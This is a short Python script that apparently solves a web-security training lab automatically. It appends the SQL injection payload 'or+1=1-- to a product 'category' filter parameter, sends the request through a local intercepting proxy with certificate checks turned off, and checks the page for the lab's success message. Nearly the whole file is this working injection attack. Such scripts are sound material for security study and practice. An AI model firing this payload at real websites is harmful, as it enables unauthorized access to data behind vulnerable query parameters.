import requests
import os, sys
################################################################################
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
################################################################################

r = requests.Session()

url = input('Enter lab url: ')
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

if url.endswith('category='):
    url += "'or+1=1--"

else:
    if url.endswith('/') and 'category' in url:
        url = (url.split('=', 1)[0])+ "'or+1=1--"
    elif url.endswith('/') and 'category' not in url:
        url += "filter?category='or+1=1--"
    elif url.endswith('/'):
        url += "filter?category='or+1=1--"
    else:
        url += "filter?category='or+1=1--"

response = r.get(url=url, proxies=proxies, verify=False)

if 'Congratulations, you solved the lab!' in response.text:
    print('Lab solved successfully')
else:
    if response.status_code == 504:
        print('Lab is not available, please refresh the url')
    else:
        print('failed to solve lab, please check you enter valid url')


